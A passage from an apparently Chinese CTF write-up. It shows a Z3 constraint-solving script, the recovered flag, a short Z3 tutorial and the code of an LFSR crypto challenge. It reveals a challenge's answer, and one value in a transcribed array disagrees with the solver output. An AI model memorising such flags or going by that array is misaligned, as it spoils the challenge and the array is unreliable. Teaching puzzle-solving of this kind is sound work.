operator">==</span> <span class="token number">0x5b31</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">26</span> <span class="token operator">*</span> v72 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v70 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v68 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v67 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v69 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v73 <span class="token operator">==</span> <span class="token number">0x313a</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">34</span> <span class="token operator">*</span> v77 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v74 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v75 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v76 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v78 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v79 <span class="token operator">+</span> v80 <span class="token operator">==</span> <span class="token number">0x3010</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">27</span> <span class="token operator">*</span> v78 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v77 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v76 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v74 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v75 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v79 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v80 <span class="token operator">==</span> <span class="token number">0x67fe</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> v76 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v74 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v75 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v77 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v78 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v79 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v80 <span class="token operator">==</span> <span class="token number">0x4d5f</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> v75 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v74 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v76 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v77 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v78 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v79 <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v80 <span class="token operator">==</span> <span class="token number">0x58db</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">*</span> v78 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v76 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v74 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v75 <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v77 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v79 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v80 <span class="token operator">==</span> <span class="token number">0x3799</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> v79 <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v78 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v76 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v75 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v74 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v77 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v80 <span class="token operator">==</span> <span class="token number">0x60a0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">26</span> <span class="token operator">*</span> v79 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v77 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v75 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v74 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v76 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v80 <span class="token operator">==</span> <span class="token number">0x2750</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">34</span> <span class="token operator">*</span> v84 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v81 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v82 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v83 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v85 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v86 <span class="token operator">+</span> v87 <span class="token operator">==</span> <span class="token number">0x3759</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">27</span> <span class="token operator">*</span> v85 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v84 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v83 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v81 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v82 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v86 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v87 <span class="token operator">==</span> <span class="token number">0x8953</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> v83 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v81 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v82 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v84 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v85 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v86 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v87 <span class="token operator">==</span> <span class="token number">0x7122</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> v82 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v81 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v83 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v84 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v85 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v86 <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v87 <span class="token operator">==</span> <span class="token number">0x81f9</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">*</span> v85 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v83 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v81 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v82 <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v84 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v86 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v87 <span class="token operator">==</span> <span class="token number">0x5524</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> v86 <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v85 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v83 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v82 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v81 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v84 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v87 <span class="token operator">==</span> <span class="token number">0x8971</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">26</span> <span class="token operator">*</span> v86 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v84 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v82 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v81 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v83 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v87 <span class="token operator">==</span> <span class="token number">0x3a1d</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>solver<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solver<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>得到结果为：</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">55</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">103</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">108</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">98</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">51</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">49</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">49</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">56</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">56</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">49</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">55</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">51</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">49</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">99</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">125</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">]</span></code></pre><p>即</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">]</span></code></pre><p>而后利用 <code>chr</code> 把数字转换为字符即可得到 flag。</p><p><code>flag{7e171d43-63b9-4e18-990e-6e14c2afe648}</code></p><hr><h2 id="Z3-Introduction"><a href="#Z3-Introduction" class="headerlink" title="Z3 Introduction"></a>Z3 Introduction</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>Z3 is a theorem prover from Microsoft Research. It is licensed under the MIT license.</p><p>If you are not familiar with Z3, you can start <a href="https://github.com/Z3Prover/z3/wiki#background" target="_blank" rel="noopener">here</a>.</p><p>Pre-built binaries for stable and nightly releases are available from <a href="https://github.com/Z3Prover/z3/releases" target="_blank" rel="noopener">here</a>.</p><p>Z3 can be built using <a href="https://github.com/Z3Prover/z3#building-z3-on-windows-using-visual-studio-command-prompt" target="_blank" rel="noopener">Visual Studio</a>, a <a href="https://github.com/Z3Prover/z3#building-z3-using-make-and-gccclang" target="_blank" rel="noopener">Makefile</a> or using <a href="https://github.com/Z3Prover/z3#building-z3-using-cmake" target="_blank" rel="noopener">CMake</a>. It provides <a href="https://github.com/Z3Prover/z3#z3-bindings" target="_blank" rel="noopener">bindings for several programming languages</a>.</p><p>See the <a href="https://github.com/Z3Prover/z3/blob/master/RELEASE_NOTES" target="_blank" rel="noopener">release notes</a> for notes on various stable releases of Z3.</p></blockquote><blockquote><p>Z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 <a href="http://angr.io/" target="_blank" rel="noopener">angr</a> 也内置了一个修改版的 Z3。</p></blockquote><p>GitHub repo: <a href="https://github.com/Z3Prover/z3" target="_blank" rel="noopener">https://github.com/Z3Prover/z3</a></p><p>Z3 - Slides:  <a href="https://github.com/Z3Prover/z3/wiki/Slides" target="_blank" rel="noopener">https://github.com/Z3Prover/z3/wiki/Slides</a></p><p>Z3 - guide ( English ): <a href="https://rise4fun.com/z3/tutorialcontent/guide" target="_blank" rel="noopener">https://rise4fun.com/z3/tutorialcontent/guide</a></p><p>Z3 API/函数接口: <a href="http://z3prover.github.io/api/html/index.html" target="_blank" rel="noopener">http://z3prover.github.io/api/html/index.html</a></p><p>（<a href="http://z3prover.github.io/api/html/namespacez3py.html" target="_blank" rel="noopener">Python 的 Z3 接口文档</a>，<a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm" target="_blank" rel="noopener">guide-examples</a>）</p><p>据说它可以解决所有的方程，当然如果有解的话。感觉就贼强大。</p><p><em>微软爸爸还是强啊（</em></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>这里就以 python3 为例了。</p><pre class=" language-bash"><code class="language-bash">pip3 <span class="token function">install</span> z3-solver</code></pre><p>注意这里不是 <code>pip install z3</code>！！！<em>（是我了嘤嘤嘤，我也不知道 pip 里的 z3 是什么玩意</em></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><strong>三步走：</strong></p><ol><li>定义未知量</li><li>添加约束条件</li><li>求解</li></ol><p><strong>注意：如果方程有多组解，z3 只会给出其中的一组解，因此可以尝试为方程添加约束条件，进一步限制解的范围，从而获得预期的一组解</strong></p><p><strong>Example:</strong></p><p>首先看最简单的例子。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>x <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>y <span class="token operator">=</span> Int<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>solve<span class="token punctuation">(</span>x <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">,</span> y <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">,</span> x <span class="token operator">+</span> <span class="token number">2</span><span class="token operator">*</span>y <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">)</span></code></pre><p>运行得到</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span>y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> x <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">]</span></code></pre><p>再来看稍微复杂一点的。</p><p>变量类型常用的包括 Int型（整数），Real型（有理数），BitVec型（位向量）。</p><p>解常用的方程一般是用 Int型，在求解位运算（如<code>&amp;</code>, <code>^</code>, <code>|</code>, <code>&gt;&gt;</code>, <code>&lt;&lt;</code> 这些）用 BitVec型就很方便，包括下面的 LFSR 也可以用到。</p><p>求解方程组的话，需要先初始化一个<code>Solver</code>（约束求解器），</p><p>然后利用 <code>add</code> 方法依次往里面加入方程。</p><p>其次判断解是否存在<br> <code>if solver.check() == sat:</code> </p><p>最后求解<br> <code>print(solver.model())</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z <span class="token operator">=</span> Ints<span class="token punctuation">(</span><span class="token string">'x y z'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 可以同时定义多个变量</span>s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">'EQU1'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">'EQU2'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">'EQU3'</span><span class="token punctuation">)</span><span class="token keyword">if</span> solver<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> sat<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solver<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>这道题里就用了这一方法来求解。</p><p>大概先写这么多，其他的还得慢慢学，可以参考下最后的拓展阅读喵~</p><hr><h2 id="LFSR"><a href="#LFSR" class="headerlink" title="LFSR"></a>LFSR</h2><p>题目所给代码如下。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">from</span> secret <span class="token keyword">import</span> flagN <span class="token operator">=</span> <span class="token number">100</span>MASK <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token punctuation">(</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">lfsr</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> mask<span class="token punctuation">)</span><span class="token punctuation">:</span>    feedback <span class="token operator">=</span> state <span class="token operator">&amp;</span> mask    feed_bit <span class="token operator">=</span> bin<span class="token punctuation">(</span>feedback<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span>    output_bit <span class="token operator">=</span> state <span class="token operator">&amp;</span> <span class="token number">1</span>    state <span class="token operator">=</span> <span class="token punctuation">(</span>state <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>feed_bit <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>N<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> state<span class="token punctuation">,</span> output_bit<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"flag{"</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> flag<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">)</span>    mask <span class="token operator">=</span> int<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> mask<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> N    state  <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> MASK<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span>    outputs <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>N<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        state<span class="token punctuation">,</span> output_bit <span class="token operator">=</span> lfsr<span class="token punctuation">(</span>state<span class="token punctuation">,</span> mask<span class="token punctuation">)</span>        outputs <span class="token operator">+=</span> str<span class="token punctuation">(</span>output_bit<span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>outputs<span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这题让我想起了这学期卫星导航课做的实验，让我们利用不同抽头的移位寄存器生成伪随机序列，还有m序列什么的。</p><blockquote><p>m序列是最长线性移位寄存器序列的简称，是一种伪随机序列、伪噪声(PN)码或伪随机码。可以预先确定并且可以重复实现的序列称为确定序列；既不能预先确定又不能重复实现的序列称随机序列；不能预先确定但可以重复产生的序列称伪随机序列。</p><p>它是由带线性反馈的移存器产生的周期最长的序列。一般来说，一个n级线性反馈移存器可能产生的最长周期等于(2^n -1)。</p><p>在通信领域有着广泛的应用，如扩频通信、卫星通信的码分多址（CDMA），数字数据中的加密、加扰、同步、误码率测量等领域。</p><p><em>Via Baidu baike</em></p></blockquote><blockquote><p><strong>线性反馈移位寄存器</strong>（linear feedback shift register, <strong>LFSR</strong>）是指，给定前一状态的输出，将该输出的线性函数再用作输入的移位寄存器。异或运算是最常见的单比特线性函数：对寄存器的某些位进行异或操作后作为输入，再对寄存器中的各比特进行整体移位。</p></blockquote><p>当时由于N较小，直接就用列表来写了，就是有点丑，后来想想可以用移位来实现。看了题目里面的 <code>def lfsr(state, mask)</code> 这一函数，发现写的就很妙啊。</p><p>当然还有这样的<em>（2018 强网杯 streamgame1，2018 国赛 oldstreamgame）</em></p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">lfsr</span><span class="token punctuation">(</span>R<span class="token punctuation">,</span>mask<span class="token punctuation">)</span><span class="token punctuation">:</span>    output <span class="token operator">=</span> <span class="token punctuation">(</span>R <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffff</span>    i<span class="token operator">=</span><span class="token punctuation">(</span>R<span class="token operator">&amp;</span>mask<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffffff</span>    lastbit<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">while</span> i<span class="token operator">!=</span><span class="token number">0</span><span class="token 